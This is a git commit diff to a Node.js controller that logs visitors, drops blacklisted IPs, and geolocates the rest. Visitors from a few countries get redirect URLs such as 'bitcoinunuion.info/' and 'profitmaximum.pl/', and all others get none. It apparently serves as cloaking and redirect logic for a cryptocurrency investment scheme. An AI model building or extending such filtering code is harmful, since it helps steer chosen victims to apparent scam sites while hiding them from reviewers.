37dc562db8ee4d156403f30d7350457d4dbfd91e
Jenia22f <Nofightnoglory22>
2020-08-12 10:45:52 +0300

    local mongoDB

--- controllers/url.js
+++ controllers/url.js
@@ -8,33 +8,39 @@ module.exports.getUrl = async function (req, res) {
         const blackIp = await Ip.findOne({ip: req.ip})
 
         if (blackIp) {
-            const user = new User({
-                UserAgent: req.body.UserAgent,
-                UTM: req.body.UTM,
-                reason: 'This ip is in black list!',
-                language: req.body.language,
-                url: null
-            });
-            await user.save()
-            res.status(200).json(false)
+                const user = new User({
+                    UserAgent: req.body.UserAgent,
+                    UTM: req.body.UTM,
+                    reason: 'This ip is in black list!',
+                    language: req.body.language,
+                    url: null
+                });
+                await user.save()
+                res.status(200).json(false)
         } else {
             let ip = req.ip
             if (ip.substr(0, 7) === "::ffff:") {
-          ip = ip.substr(7)
-    }
-            let url = checkCountry(ip)
-            let reason = null
-            if (url === null) reason = 'Invalid country'
-            const user = new User({
-                UserAgent: req.body.UserAgent,
-                UTM: req.body.UTM,
-                reason: reason,
-                language: req.body.language,
-                url: url
-            });
-            await user.save()
-            res.status(200).json({status: true,
-            url})
+                ip = ip.substr(7)
+            }
+                let url = checkCountry(ip)
+                let reason = null
+                if (url === null) {
+                    reason = 'Invalid country'
+                    res.status(200).json(false)
+                } else {
+                    res.status(200).json({
+                        status: true,
+                        url
+                    })
+                }
+                const user = new User({
+                    UserAgent: req.body.UserAgent,
+                    UTM: req.body.UTM,
+                    reason: reason,
+                    language: req.body.language,
+                    url: url
+                });
+                await user.save()
         }
 
     } catch (e) {
@@ -47,20 +53,20 @@ function checkCountry(ip) {
     if (geo === null) {
         url = null
     } else {
-    switch (geo.country) {
-        case "CN":
-            return url = 'bitcoinunuion.info/'
-        case "UK":
-            return url = 'bitcoinunuion.info/'
-        case "AU":
-            return url = 'bitcoinunuion.info/'
-        case "SG":
-            return url = 'bitcoinunuion.info/'
-        case "PL":
-            return url = 'profitmaximum.pl/'
-        default:
-            return url = null;
-    }
+        switch (geo.country) {
+            case "CN":
+                return url = 'bitcoinunuion.info/'
+            case "UK":
+                return url = 'bitcoinunuion.info/'
+            case "AU":
+                return url = 'bitcoinunuion.info/'
+            case "SG":
+                return url = 'bitcoinunuion.info/'
+            case "PL":
+                return url = 'profitmaximum.pl/'
+            default:
+                return url = null;
+        }
     }
     return url
 }
